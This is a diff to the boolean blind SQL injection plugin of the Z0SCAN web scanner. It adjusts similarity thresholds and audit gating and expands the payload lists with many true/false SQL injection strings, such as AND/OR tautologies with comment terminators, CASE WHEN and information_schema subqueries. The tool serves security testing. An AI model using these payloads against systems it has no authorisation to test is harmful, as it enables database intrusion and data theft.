@@ -24,7 +24,7 @@ class Z0SCAN(PluginBase):
         self.UPPER_RATIO_BOUND = 0.98
         self.LOWER_RATIO_BOUND = 0.02
         # 设置页面相似度的差异容忍度
-        self.DIFF_TOLERANCE = 0.05
+        self.DIFF_TOLERANCE = 0.02
         # 设置常量相似度阈值
         self.CONSTANT_RATIO = 0.9
         # 设置重试次数
@@ -89,7 +89,7 @@ class Z0SCAN(PluginBase):
                 "payload": payload_true
                 })
         r = self.req(position, payload)
-        
+
         truePage = removeDynamicContent(r.text, self.dynamic)
         falsePage = removeDynamicContent(r2.text, self.dynamic)
         originalPage = removeDynamicContent(self.resp_str, self.dynamic)
@@ -107,14 +107,14 @@ class Z0SCAN(PluginBase):
             return False
         if truePage == falsePage:
             return False
-
+        
         try:
             self.seqMatcher.set_seq1(self.resp_str or "")
             self.seqMatcher.set_seq2(truePage or "")
             ratio_true = round(self.seqMatcher.quick_ratio(), 3)
         except (MemoryError, OverflowError):
             return False
-            
+        
         # 使用概率值作为判断依据
         if ratio_true > self.UPPER_RATIO_BOUND and abs(ratio_true - ratio_false) > self.DIFF_TOLERANCE:
             if ratio_false <= self.UPPER_RATIO_BOUND:
@@ -152,7 +152,7 @@ class Z0SCAN(PluginBase):
             return False
 
     def audit(self):
-        if not (self.risk in conf.risk or conf.level != 0):
+        if not (conf.level != 0):
             return
         count = 0
         ratio = 0
@@ -186,26 +186,44 @@ class Z0SCAN(PluginBase):
             return
         # ["true", "false"]
         payloads = [
-            ["'-'0", "'-'10000"],
-            ['"-"0', '"-"10000'], 
-            ["'AND'True", "'AND'False"],
-            ['"AND"True', '"AND"False'],
-            ["') AND True#", "') AND False#"],
-            ['") AND True#', '") AND False#'], 
+            [r"' AND 1221=1221 AND '1'='1", r"' AND 1221=1 AND '1'='1"],
+            [r'" AND 1221=1221 AND "1"="1', r'" AND 1221=1 AND "1"="1'],
+            [r" AND 1221=1221%23", r" AND 1221=1%23"],
+            [r") AND 3524=3524 AND (2568=2568", r") AND 1221=1 AND (2568=2568"],
+            [r"%' AND 3534=5303 AND '%'='", r"%' AND 3534=1 AND '%'='"],
+            [r" OR 7913=7913%23", r" OR 7913=1%23"],
+            [r"') AND 4691=4691%23", r"') AND 4691=1%23"],
+            [r"')) AS cGQn WHERE 8783=8783 AND 5105=5105%23", r"')) AS cGQn WHERE 8783=8783 AND 5105=1%23"],
+            [r",(CASE WHEN (1=1) THEN FIELD ELSE -FIELD END)", r",(CASE WHEN (1=2) THEN FIELD ELSE -FIELD END)"], 
+            [r",if('1'='1',1,(select 1 from information_schema.tables))", r",if('1'='2',1,(select 1 from information_schema.tables))"], 
         ]
         if conf.level == 3:
             payloads += [
-                ["''AND''True", "''AND''False"],
-                ['""AND True#""', '""AND False#""'],
+                [r"' AND 11=11 AND '1'='1", r"' AND 11=1 AND '1'='1"],
+                [r'" AND 11=11 AND "1"="1', r'" AND 11=1 AND "1"="1'],
+                [r" AND 11=11%23", r" AND 11=1%23"],
+                [r") AND 11=11 AND (2568=2568", r") AND 11=1 AND (2568=2568"],
+                [r"%' AND 11=11 AND '%'='", r"%' AND 11=1 AND '%'='"],
+                [r" OR 11=11%23", r" OR 11=1%23"],
+                [r"') AND 11=11%23", r"') AND 11=1%23"],
+                [r"')) AS cGQn WHERE 8783=8783 AND 11=11%23", r"')) AS cGQn WHERE 8783=8783 AND 11=1%23"],
             ]
         if str(v).isdigit():
             int_payloads = [
                 ["-0", "-10000"],
                 ["/1", "/0"],
-                [" AND True", " AND False"],
-                [" AND True#", " AND False#"],
+                [" AND 1221=1221%23", " AND 1221=1%23"],
+                [" OR 7913=7913%23", " OR 7913=1%23"],
+                ["') AND 4691=4691%23", "') AND 4691=1%23"],
             ]
             payloads = int_payloads + payloads
+            if conf.level == 3:
+                int_payloads += [
+                    [" AND 11=11%23", " AND 11=1%23"],
+                    [" OR 11=11%23", " OR 11=1%23"],
+                    ["') AND 11=11%23", "') AND 11=1%23"],
+                ]
+                payloads += int_payloads
         if self.fingerprints.waf:
             if str(v).isdigit():
                 payloads = [
